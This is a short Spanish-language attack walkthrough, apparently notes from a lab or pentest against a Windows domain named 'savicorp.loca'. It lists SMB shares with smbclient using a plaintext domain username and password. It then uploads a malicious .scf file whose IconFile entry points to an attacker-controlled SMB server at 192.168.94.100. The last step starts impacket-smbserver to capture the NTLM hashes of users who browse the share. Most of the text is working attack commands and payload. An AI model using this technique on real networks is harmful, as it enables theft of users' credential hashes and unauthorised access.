Listar recursos compartidos por  SMB
```
smbclient -U 'savicorp.loca\mvazquez%P@ssword1' -L DC-2019
```

```
smbclient -U 'savicorp.loca\mvazquez%P@ssword1' //DC-2019/Copartida
```

Subimos el archivo scf malicioso al recurso compartido . Abrimos la conexion de samba desde donde enemos el archifo .scf con el codigo malicioso
```
[Shell]
Command=2
IconFile=\\192.168.94.100\smbFolder\Testlab.ico
[Taskbar]
Command=ToggleDesktop

```

```
smbclient -U 'savicorp.loca\mvazquez%P@ssword1' -L DC-2019
smb>put file.scf 
```

Nos ponemos a escucha eserando que caigan los hash de usuarios que caen

```
sudo impacket-smbserver -debug -smb2support smbFolder $(pwd)
```